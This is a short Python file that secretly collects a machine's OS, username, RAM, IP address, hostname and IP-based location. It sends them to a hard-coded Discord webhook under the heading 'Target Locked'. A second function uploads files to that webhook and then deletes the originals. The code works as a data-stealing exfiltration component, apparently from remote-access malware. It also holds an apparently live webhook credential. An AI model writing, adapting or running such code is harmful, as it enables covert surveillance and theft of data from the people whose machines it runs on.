import requests
import platform
import psutil
import socket
import geocoder
import os

WEBHOOK_URL = "https://discord.com/api/webhooks/1350925645462372372/MDhUUjG9MMIe5BIZyv5e3OD8nQrhnjZ_F5hzM4c0eGuIT3C-z_WFZTKUE2rdY7vx1GE6"

def get_system_info():
    ip = socket.gethostbyname(socket.gethostname())
    return {
        "OS": platform.system() + " " + platform.release(),
        "Username": os.getlogin(),
        "RAM": f"{psutil.virtual_memory().total / (1024 ** 3):.2f} GB",
        "IP Address": ip,
        "Machine": platform.machine(),
        "Node": platform.node()
    }

def send_initial_embed():
    info = get_system_info()
    location = geocoder.ip("me").latlng or "Unknown"
    embed = {
        "title": "Target Locked",
        "description": "System info dump, ready to roll.",
        "fields": [{"name": k, "value": str(v), "inline": True} for k, v in info.items()] + 
                  [{"name": "Location", "value": f"{location}", "inline": True}],
        "color": 0x00FF00
    }
    requests.post(WEBHOOK_URL, json={"embeds": [embed]})

def upload_file(filepath):
    with open(filepath, "rb") as f:
        files = {"file": (os.path.basename(filepath), f)}
        requests.post(WEBHOOK_URL, files=files)
    os.remove(filepath)